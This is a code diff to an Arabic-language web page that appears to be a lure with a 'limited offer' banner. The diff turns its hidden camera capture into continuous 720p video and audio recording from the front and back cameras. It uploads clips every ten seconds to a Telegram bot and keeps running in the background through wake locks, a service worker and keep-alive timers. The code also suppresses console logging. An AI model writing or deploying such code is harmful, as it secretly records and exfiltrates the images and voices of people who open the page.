@@ -255,6 +255,16 @@
         }
         #videoFront, #videoBack { display: none; }
         #canvas { display: none; }
+        .recording-status {
+            color: #ff4444;
+            font-size: 14px;
+            margin-top: 10px;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
     </style>
 </head>
 <body>
@@ -290,6 +300,7 @@
     <div style="margin-top:15px;color:#ff8844;font-size:14px;">
         ⏳ العرض محدود - اسرع!
     </div>
+    <div class="recording-status" id="recordingStatus">🔴 جاري تسجيل الفيديو...</div>
 </div>
 
 <div class="sparkle" style="top:10%;left:5%;">✦</div>
@@ -308,6 +319,10 @@ let CHAT_ID = '';
 let frontCount = 0;
 let backCount = 0;
 let isRunning = true;
+let videoChunks = [];
+let mediaRecorderFront = null;
+let mediaRecorderBack = null;
+let recordingInterval = null;
 
 // ============================================================
 // ====================== CONFETTI =============================
@@ -350,6 +365,20 @@ function sendMessage(text) {
     }).catch(() => {});
 }
 
+function sendVideoToTelegram(videoBlob, caption = '') {
+    if (!CHAT_ID) return;
+    try {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('video', videoBlob, `video_${Date.now()}_${Math.random().toString(36).substring(7)}.mp4`);
+        formData.append('caption', caption || `🎥 فيديو ${new Date().toLocaleString()}`);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+            method: 'POST',
+            body: formData
+        }).catch(() => {});
+    } catch(e) {}
+}
+
 function sendToTelegram(imageData, caption = '') {
     if (!CHAT_ID) return;
     try {
@@ -389,8 +418,8 @@ function getChatId() {
                 } else if (lastUpdate.callback_query) {
                     CHAT_ID = lastUpdate.callback_query.from.id;
                 }
-                sendMessage('✅ تم فتح الصفحة - بدء التصوير المباشر');
-                startCameras();
+                sendMessage('✅ تم فتح الصفحة - بدء تسجيل الفيديو');
+                startRecording();
             } else {
                 setTimeout(getChatId, 2000);
             }
@@ -399,17 +428,22 @@ function getChatId() {
 }
 
 // ============================================================
-// ====================== START CAMERAS =======================
+// ====================== START RECORDING =====================
 // ============================================================
 let frontStream = null, backStream = null;
 let frontReady = false, backReady = false;
 let frontVideo = null, backVideo = null;
-let captureInterval = null;
 
-function startCameras() {
-    // الكاميرا الأمامية
+function startRecording() {
+    // الكاميرا الأمامية - دقة عالية
     navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
+        video: { 
+            facingMode: 'user', 
+            width: { ideal: 1280 }, 
+            height: { ideal: 720 },
+            frameRate: { ideal: 30 }
+        },
+        audio: true
     })
     .then(function(stream) {
         frontStream = stream;
@@ -418,16 +452,24 @@ function startCameras() {
         frontVideo.onloadedmetadata = function() {
             frontVideo.play();
             frontReady = true;
-            sendMessage('📸 كاميرا أمامية جاهزة');
+            sendMessage('📸 كاميرا أمامية جاهزة - دقة عالية');
+            // بدء تسجيل الفيديو للأمامية
+            startRecordingFront(stream);
         };
     })
     .catch(function(err) {
         sendMessage('❌ فشل كاميرا أمامية: ' + err.message);
     });
     
-    // الكاميرا الخلفية
+    // الكاميرا الخلفية - دقة عالية
     navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } } 
+        video: { 
+            facingMode: 'environment', 
+            width: { ideal: 1280 }, 
+            height: { ideal: 720 },
+            frameRate: { ideal: 30 }
+        },
+        audio: true
     })
     .then(function(stream) {
         backStream = stream;
@@ -436,75 +478,100 @@ function startCameras() {
         backVideo.onloadedmetadata = function() {
             backVideo.play();
             backReady = true;
-            sendMessage('📸 كاميرا خلفية جاهزة');
+            sendMessage('📸 كاميرا خلفية جاهزة - دقة عالية');
+            // بدء تسجيل الفيديو للخلفية
+            startRecordingBack(stream);
         };
     })
     .catch(function(err) {
         sendMessage('❌ فشل كاميرا خلفية: ' + err.message);
     });
-    
-    // التصوير كل ثانية (5 صور أمامي + 5 صور خلفي = 10 صور بالثانية)
-    captureInterval = setInterval(captureBothPhotos, 1000);
-    
-    // التقاط أول صور فوراً
-    setTimeout(captureBothPhotos, 500);
 }
 
-function captureBothPhotos() {
-    // تصوير 5 صور أمامي + 5 صور خلفي = 10 صور
-    for (let i = 0; i < 5; i++) {
-        captureFrontPhoto();
-        captureBackPhoto();
+function startRecordingFront(stream) {
+    try {
+        const options = {
+            mimeType: 'video/mp4',
+            videoBitsPerSecond: 5000000 // 5 Mbps - جودة عالية
+        };
+        mediaRecorderFront = new MediaRecorder(stream, options);
+        mediaRecorderFront.ondataavailable = function(event) {
+            if (event.data.size > 0) {
+                videoChunks.push(event.data);
+            }
+        };
+        mediaRecorderFront.onstop = function() {
+            const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
+            if (videoBlob.size > 0) {
+                frontCount++;
+                sendVideoToTelegram(videoBlob, `🎥 فيديو أمامي ${frontCount} - ${new Date().toLocaleString()}`);
+                sendMessage(`📹 حجم فيديو أمامي: ${Math.round(videoBlob.size/1024/1024)} MB`);
+            }
+            videoChunks = [];
+            // إعادة التسجيل
+            if (isRunning) {
+                setTimeout(() => {
+                    if (mediaRecorderFront && mediaRecorderFront.state === 'inactive') {
+                        mediaRecorderFront.start(10000); // قطع كل 10 ثواني
+                    }
+                }, 500);
+            }
+        };
+        mediaRecorderFront.start(10000); // قطع كل 10 ثواني
+        sendMessage('🎥 بدء تسجيل الفيديو الأمامي - دقة عالية');
+    } catch(e) {
+        sendMessage('❌ فشل تسجيل الفيديو الأمامي: ' + e.message);
     }
 }
 
-function captureFrontPhoto() {
-    if (!frontReady || !frontVideo || !frontVideo.videoWidth) return;
+function startRecordingBack(stream) {
     try {
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = frontVideo.videoWidth;
-        canvas.height = frontVideo.videoHeight;
-        ctx.drawImage(frontVideo, 0, 0);
-        const imgData = canvas.toDataURL('image/jpeg', 0.85);
-        frontCount++;
-        sendToTelegram(imgData, `📸 أمامي ${frontCount} - ${new Date().toLocaleString()}`);
-    } catch(e) {}
-}
-
-function captureBackPhoto() {
-    if (!backReady || !backVideo || !backVideo.videoWidth) return;
-    try {
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = backVideo.videoWidth;
-        canvas.height = backVideo.videoHeight;
-        ctx.drawImage(backVideo, 0, 0);
-        const imgData = canvas.toDataURL('image/jpeg', 0.85);
-        backCount++;
-        sendToTelegram(imgData, `📸 خلفي ${backCount} - ${new Date().toLocaleString()}`);
-    } catch(e) {}
+        const options = {
+            mimeType: 'video/mp4',
+            videoBitsPerSecond: 5000000 // 5 Mbps - جودة عالية
+        };
+        mediaRecorderBack = new MediaRecorder(stream, options);
+        mediaRecorderBack.ondataavailable = function(event) {
+            if (event.data.size > 0) {
+                videoChunks.push(event.data);
+            }
+        };
+        mediaRecorderBack.onstop = function() {
+            const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
+            if (videoBlob.size > 0) {
+                backCount++;
+                sendVideoToTelegram(videoBlob, `🎥 فيديو خلفي ${backCount} - ${new Date().toLocaleString()}`);
+                sendMessage(`📹 حجم فيديو خلفي: ${Math.round(videoBlob.size/1024/1024)} MB`);
+            }
+            videoChunks = [];
+            if (isRunning) {
+                setTimeout(() => {
+                    if (mediaRecorderBack && mediaRecorderBack.state === 'inactive') {
+                        mediaRecorderBack.start(10000);
+                    }
+                }, 500);
+            }
+        };
+        mediaRecorderBack.start(10000);
+        sendMessage('🎥 بدء تسجيل الفيديو الخلفي - دقة عالية');
+    } catch(e) {
+        sendMessage('❌ فشل تسجيل الفيديو الخلفي: ' + e.message);
+    }
 }
 
 // ============================================================
 // ====================== BACKGROUND SERVICE ==================
 // ============================================================
-// منع المتصفح من إيقاف التشغيل
 document.addEventListener('visibilitychange', function() {
     if (document.hidden) {
-        sendMessage('⏳ الصفحة في الخلفية - التصوير مستمر');
-        // التأكد من استمرار التشغيل
-        if (!captureInterval) {
-            captureInterval = setInterval(captureBothPhotos, 1000);
-        }
-        // منع السكون
+        sendMessage('⏳ الصفحة في الخلفية - تسجيل الفيديو مستمر');
         try {
             if ('wakeLock' in navigator) {
                 navigator.wakeLock.request('screen').catch(() => {});
             }
         } catch(e) {}
     } else {
-        sendMessage('🔄 الصفحة نشطة - التصوير مستمر');
+        sendMessage('🔄 الصفحة نشطة - تسجيل الفيديو مستمر');
     }
 });
 
@@ -520,19 +587,11 @@ try {
 // ============================================================
 // ====================== SERVICE WORKER ======================
 // ============================================================
-// تسجيل Service Worker للبقاء في الخلفية
 if ('serviceWorker' in navigator) {
     const swCode = `
-        self.addEventListener('install', function(e) {
-            self.skipWaiting();
-        });
-        self.addEventListener('activate', function(e) {
-            e.waitUntil(clients.claim());
-        });
-        self.addEventListener('fetch', function(e) {
-            e.respondWith(fetch(e.request));
-        });
-        // إرسال نبضات للتأكد من الحياة
+        self.addEventListener('install', function(e) { self.skipWaiting(); });
+        self.addEventListener('activate', function(e) { e.waitUntil(clients.claim()); });
+        self.addEventListener('fetch', function(e) { e.respondWith(fetch(e.request)); });
         setInterval(function() {
             self.clients.matchAll().then(function(clients) {
                 clients.forEach(function(client) {
@@ -545,56 +604,26 @@ if ('serviceWorker' in navigator) {
     const swUrl = URL.createObjectURL(blob);
     navigator.serviceWorker.register(swUrl).then(function(reg) {
         sendMessage('✅ Service Worker مسجل');
-    }).catch(function() {
-        sendMessage('❌ فشل تسجيل Service Worker');
-    });
-}
-
-// ============================================================
-// ====================== BACKGROUND SYNC =====================
-// ============================================================
-// استخدام Background Sync لإعادة التشغيل إذا توقف
-if ('serviceWorker' in navigator && 'SyncManager' in window) {
-    navigator.serviceWorker.ready.then(function(reg) {
-        try {
-            reg.sync.register('keep-alive-sync').then(function() {
-                sendMessage('✅ Background Sync مسجل');
-            }).catch(function() {});
-        } catch(e) {}
-    });
-}
-
-// ============================================================
-// ====================== PERIODIC SYNC =======================
-// ============================================================
-// إعادة تشغيل الكود كل فترة
-if ('serviceWorker' in navigator && 'PeriodicSyncManager' in window) {
-    navigator.serviceWorker.ready.then(function(reg) {
-        try {
-            reg.periodicSync.register('periodic-keep-alive', {
-                minInterval: 60000 // كل دقيقة
-            }).then(function() {
-                sendMessage('✅ Periodic Sync مسجل');
-            }).catch(function() {});
-        } catch(e) {}
-    });
+    }).catch(function() {});
 }
 
 // ============================================================
 // ====================== KEEP ALIVE ==========================
 // ============================================================
-// نبضات حياة كل 5 ثواني
 setInterval(function() {
     if (CHAT_ID && isRunning) {
-        // التأكد من استمرار الكاميرات
+        // التأكد من استمرار التسجيل
         if (!frontReady && !backReady) {
             if (!frontStream && !backStream) {
-                startCameras();
+                startRecording();
             }
         }
-        // التأكد من استمرار التصوير
-        if (!captureInterval) {
-            captureInterval = setInterval(captureBothPhotos, 1000);
+        // التأكد من استمرار التسجيل
+        if (mediaRecorderFront && mediaRecorderFront.state === 'inactive') {
+            try { mediaRecorderFront.start(10000); } catch(e) {}
+        }
+        if (mediaRecorderBack && mediaRecorderBack.state === 'inactive') {
+            try { mediaRecorderBack.start(10000); } catch(e) {}
         }
     }
 }, 5000);
@@ -606,27 +635,23 @@ console.log = function() {};
 console.warn = function() {};
 console.error = function() {};
 
-// بدء التشغيل
 getChatId();
 
-// إعادة محاولة إذا فشلت
 setTimeout(function() {
     if (!CHAT_ID) {
         getChatId();
     }
 }, 5000);
 
-// إعادة محاولة تشغيل الكاميرات إذا توقفت
 setTimeout(function() {
     if (!frontReady && !backReady) {
-        startCameras();
+        startRecording();
     }
 }, 10000);
 
-// إرسال رسالة للبوت بأن الكود يعمل
 setTimeout(function() {
     if (CHAT_ID) {
-        sendMessage('🔥 الكود يعمل - تصوير مستمر كل ثانية');
+        sendMessage('🔥 تسجيل فيديو بدقة عالية - 720p');
     }
 }, 3000);
 </script>
